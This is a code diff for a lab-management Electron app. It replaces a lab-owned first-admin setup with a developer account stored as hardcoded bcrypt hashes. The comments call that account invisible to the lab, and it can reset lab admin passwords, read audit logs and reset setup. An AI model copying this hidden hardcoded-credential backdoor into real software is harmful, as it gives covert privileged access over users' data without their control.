@@ -1,12 +1,15 @@
 import { app, BrowserWindow, ipcMain, dialog, shell } from 'electron';
 import path from 'path';
 import fs from 'fs';
+import os from 'os';
 import crypto from 'crypto';
 import bcrypt from 'bcryptjs';
 import { z } from 'zod';
 import { getDb, getDbPath, closeDb, checkIntegrity } from '../../src/db/db';
 import { seed } from '../../src/db/seed';
 import { runBackup, pruneAutoBackups, listBackups, replaceLiveDatabase } from '../backup';
+import { DEV_NAME, DEV_CONTACT } from '../devConfig';
+import { attemptDevLogin, getDevLockoutStatus } from '../devAuth';
 import {
   usersRepo,
   patientsRepo,
@@ -24,6 +27,7 @@ import {
   clinicSettingsRepo,
   catalogRepo,
   printSettingsRepo,
+  setupRepo,
 } from '../../src/db/repositories';
 import { generateReportPdf, generateAlignmentTestPage, generateRevenuePdf, generateTestReportPdf, printPdfBuffer } from '../print';
 import { buildArchivePath } from '../reportArchive';
@@ -49,8 +53,8 @@ import {
   auditLogFiltersSchema,
   searchQuerySchema,
   passwordSchema,
-  usernameSchema,
-  fullNameSchema,
+  strongPasswordSchema,
+  labSetupSchema,
   idSchema,
 } from '../../src/db/validation';
 import { buildTestCatalogWorkbook, parseTestCatalogWorkbook, buildReportsWorkbook, buildRevenueWorkbook } from '../../src/db/excel';
@@ -277,91 +281,13 @@ function handle<T>(channel: string, fn: (event: Electron.IpcMainInvokeEvent, ...
 // Auth
 // ---------------------------------------------------------------
 
-// Whether this install has never had an admin account created yet — the
-// renderer uses this to decide between showing the normal Login screen
-// and the one-time "set up your admin account" screen. Deliberately not
-// gated behind requireAuth: there's no session yet to require.
+// Whether this install has ever finished the Developer Setup + Lab Setup
+// Wizard flow (see the "Developer setup & support access" section below) —
+// the renderer uses this to decide between the normal Login screen and the
+// one-time Developer Setup screen. Deliberately not gated behind
+// requireAuth: there's no session yet to require.
 handle('auth:needsSetup', () => {
-  return !usersRepo.hasAnyUsers(db());
-});
-
-// Lets whoever is physically installing LabCore set the very first
-// account themselves — on the spot, known only to them — instead of the
-// app seeding a fixed or auto-generated password that would sit in the
-// database (and, previously, a plaintext file) before they've typed
-// anything in. Guarded by the same hasAnyUsers() check as the "needs
-// setup" screen itself: once ANY user exists, this handler refuses to run
-// again, so it can never be used to slip in a second, unauthorized admin
-// account later. Marked is_provisional: this account exists only to get
-// past the empty-database gate and immediately hand off to
-// auth:createLabAccount below — once the lab's own account exists, this
-// one is deactivated and can never log in again.
-handle('auth:createFirstAdmin', (_e, rawUsername: string, rawPassword: string, rawFullName: string) => {
-  if (usersRepo.hasAnyUsers(db())) {
-    throw new Error('Setup has already been completed on this install.');
-  }
-  const parsedUsername = usernameSchema.safeParse(rawUsername);
-  if (!parsedUsername.success) {
-    throw new Error(parsedUsername.error.errors.map((e) => e.message).join('; '));
-  }
-  const parsedPassword = passwordSchema.safeParse(rawPassword);
-  if (!parsedPassword.success) {
-    throw new Error(parsedPassword.error.errors.map((e) => e.message).join('; '));
-  }
-  const parsedFullName = fullNameSchema.safeParse(rawFullName);
-  if (!parsedFullName.success) {
-    throw new Error(parsedFullName.error.errors.map((e) => e.message).join('; '));
-  }
-  const user = usersRepo.createUser(db(), {
-    username: parsedUsername.data,
-    password_hash: bcrypt.hashSync(parsedPassword.data, 10),
-    full_name: parsedFullName.data,
-    role: 'ADMIN',
-    is_provisional: true,
-  });
-  currentUser = user;
-  audit('CREATE', 'user', user.id, { username: user.username, initial_setup: true });
-  audit('LOGIN', 'user', user.id);
-  return { ok: true, user, needsLabAccount: true };
-});
-
-// Only ever callable by whoever is currently logged in as the still-active
-// provisional account created above — this is what actually hands the
-// install off to the lab. The lab picks their own username AND password
-// here (unlike ForceChangePassword, which only ever resets the password
-// on the SAME account), and the provisional account is deactivated in the
-// same breath, so from this point on only the lab's own credentials can
-// ever log in — not the ones used to install it.
-handle('auth:createLabAccount', (_e, rawUsername: string, rawPassword: string, rawFullName: string) => {
-  const caller = requireAuth();
-  const callerRow = usersRepo.getUserById(db(), caller.id);
-  if (!callerRow || !callerRow.is_provisional || !callerRow.is_active) {
-    throw new Error('This account cannot create the lab account.');
-  }
-  const parsedUsername = usernameSchema.safeParse(rawUsername);
-  if (!parsedUsername.success) {
-    throw new Error(parsedUsername.error.errors.map((e) => e.message).join('; '));
-  }
-  const parsedPassword = passwordSchema.safeParse(rawPassword);
-  if (!parsedPassword.success) {
-    throw new Error(parsedPassword.error.errors.map((e) => e.message).join('; '));
-  }
-  const parsedFullName = fullNameSchema.safeParse(rawFullName);
-  if (!parsedFullName.success) {
-    throw new Error(parsedFullName.error.errors.map((e) => e.message).join('; '));
-  }
-  const labUser = usersRepo.createUser(db(), {
-    username: parsedUsername.data,
-    password_hash: bcrypt.hashSync(parsedPassword.data, 10),
-    full_name: parsedFullName.data,
-    role: 'ADMIN',
-  });
-  usersRepo.updateUser(db(), callerRow.id, { is_active: 0 });
-  currentUser = labUser;
-  audit('CREATE', 'user', labUser.id, { username: labUser.username, lab_setup: true });
-  audit('UPDATE', 'user', callerRow.id, { is_active: false, reason: 'provisional_setup_account_retired' });
-  audit('LOGIN', 'user', labUser.id);
-  return { ok: true, user: labUser };
+  return !setupRepo.isSetupCompleted(db());
 });
 
 handle('auth:login', (_e, rawUsername: string, rawPassword: string) => {
@@ -383,13 +309,6 @@ handle('auth:login', (_e, rawUsername: string, rawPassword: string) => {
 
   currentUser = usersRepo.toPublicUser(user);
   audit('LOGIN', 'user', user.id);
-  // Resumes an interrupted setup: if whoever just logged in is still the
-  // provisional install account (the app was closed before the lab's own
-  // account got created), send them straight back to that step instead of
-  // into the normal app.
-  if (user.is_provisional) {
-    return { ok: true, user: currentUser, needsLabAccount: true };
-  }
   return { ok: true, user: currentUser, mustChangePassword: !!user.must_change_password };
 });
 
@@ -412,6 +331,149 @@ handle('auth:changePassword', (_e, oldPassword: string, newPassword: string) => 
   }
   usersRepo.setPassword(db(), user.id, bcrypt.hashSync(parsed.data, 10), false);
   audit('CHANGE_PASSWORD', 'user', user.id);
+  return { ok: true };
+});
+
+// ---------------------------------------------------------------
+// Developer setup & support access
+//
+// The developer account is not a row in the `users` table — it exists
+// only as two bcrypt hashes in electron/devConfig.ts, verified by
+// attemptDevLogin (electron/devAuth.ts). That's what makes it invisible to
+// the lab: it can never appear in the Users list, can never be edited or
+// deactivated from there, and a lab user literally named "admin" has no
+// relationship to it at all. `devUnlocked` is this session's one-time
+// elevated state — set by a successful dev:login, cleared the moment setup
+// finishes or the Developer Panel is closed, and gates every handler below
+// instead of requireAuth/requireAdmin (there may be no signed-in user at
+// all when these run — Stage 1 happens before any account exists, and the
+// support-access path is reached from the Login screen before signing in).
+// ---------------------------------------------------------------
+
+let devUnlocked = false;
+
+function requireDevUnlocked(): void {
+  if (!devUnlocked) throw new Error('Developer access required.');
+}
+
+handle('dev:info', () => ({ name: DEV_NAME, contact: DEV_CONTACT }));
+
+handle('dev:lockoutStatus', () => getDevLockoutStatus(db()));
+
+handle('dev:login', async (_e, username: string, password: string) => {
+  const result = await attemptDevLogin(db(), username, password);
+  // user_id is always null here — by definition nobody is signed in yet
+  // (Stage 1) or this is a step-up check that doesn't touch the lab
+  // session (support access from the Login screen).
+  auditRepo.recordAudit(db(), {
+    user_id: null,
+    action: result.ok ? 'DEV_LOGIN_SUCCESS' : 'DEV_LOGIN_FAILED',
+    entity: 'developer',
+    entity_id: null,
+  });
+  if (result.ok) devUnlocked = true;
+  return result;
+});
+
+// Called when the Developer Panel is closed — without this, devUnlocked
+// would stay true for the rest of the app session, so a later
+// Ctrl+Shift+Alt+D on the Login screen would skip the credential check
+// entirely.
+handle('dev:logout', () => {
+  devUnlocked = false;
+});
+
+handle('dev:pickReportFolder', async () => {
+  requireDevUnlocked();
+  if (!mainWindow) return null;
+  const result = await dialog.showOpenDialog(mainWindow, { properties: ['openDirectory', 'createDirectory'] });
+  if (result.canceled || result.filePaths.length === 0) return null;
+  return result.filePaths[0];
+});
+
+handle('dev:completeLabSetup', (_e, payload) => {
+  requireDevUnlocked();
+  if (setupRepo.isSetupCompleted(db())) {
+    throw new Error('Setup has already been completed on this install.');
+  }
+  const input = labSetupSchema.parse(payload);
+  const admin = setupRepo.completeLabSetup(db(), {
+    clinic: input.clinic,
+    admin: {
+      full_name: input.admin.full_name,
+      username: input.admin.username,
+      password_hash: bcrypt.hashSync(input.admin.password, 10),
+    },
+  });
+  devUnlocked = false;
+  // Deliberately does NOT sign the new admin in — Finish Setup hands off to
+  // the normal Login screen, so the very first thing that happens on this
+  // install is a real login with the credentials just chosen, the same as
+  // every login after it.
+  return { ok: true, user: admin };
+});
+
+handle('dev:systemInfo', () => {
+  requireDevUnlocked();
+  // No hardware-UUID library is bundled (adding one would mean a new
+  // native module to cross-compile for Windows) — this derives a stable,
+  // machine-specific id from OS-reported values instead. It's stable
+  // across restarts on the same machine, but isn't a guaranteed-unique
+  // hardware serial the way a dedicated library's would be.
+  const machineSeed = `${os.hostname()}|${os.platform()}|${os.arch()}|${os.cpus()[0]?.model ?? ''}|${os.totalmem()}`;
+  const machineId = crypto.createHash('sha256').update(machineSeed).digest('hex').slice(0, 16).toUpperCase();
+  return {
+    appVersion: app.getVersion(),
+    electronVersion: process.versions.electron,
+    chromeVersion: process.versions.chrome,
+    nodeVersion: process.versions.node,
+    platform: os.platform(),
+    osRelease: os.release(),
+    arch: os.arch(),
+    machineId,
+    dbPath: getDbPath(getUserDataPath()),
+    userDataPath: getUserDataPath(),
+  };
+});
+
+handle('dev:listAdmins', () => {
+  requireDevUnlocked();
+  return usersRepo.listUsers(db()).filter((u) => u.role === 'ADMIN');
+});
+
+handle('dev:resetLabAdminPassword', (_e, userId: number, newPassword: string) => {
+  requireDevUnlocked();
+  const parsed = strongPasswordSchema.parse(newPassword);
+  const id = idSchema.parse(userId);
+  usersRepo.setPassword(db(), id, bcrypt.hashSync(parsed, 10), true);
+  auditRepo.recordAudit(db(), { user_id: null, action: 'DEV_RESET_PASSWORD', entity: 'user', entity_id: id });
+  return { ok: true };
+});
+
+handle('dev:auditLog', (_e, filters) => {
+  requireDevUnlocked();
+  return auditRepo.listAuditLogPage(db(), auditLogFiltersSchema.parse(filters ?? {}));
+});
+
+// There's no dedicated log-file subsystem in LabCore — this opens the
+// app's userData folder (the database, its backups, and anything else
+// written to disk), the closest thing to a "logs folder" available for a
+// visiting developer to inspect.
+handle('dev:openLogsFolder', () => {
+  requireDevUnlocked();
+  shell.openPath(getUserDataPath());
+});
+
+handle('dev:dbIntegrityCheck', () => {
+  requireDevUnlocked();
+  return checkIntegrity(db());
+});
+
+handle('dev:resetSetup', () => {
+  requireDevUnlocked();
+  setupRepo.resetSetup(db());
+  currentUser = null;
+  devUnlocked = false;
   return { ok: true };
 });
 
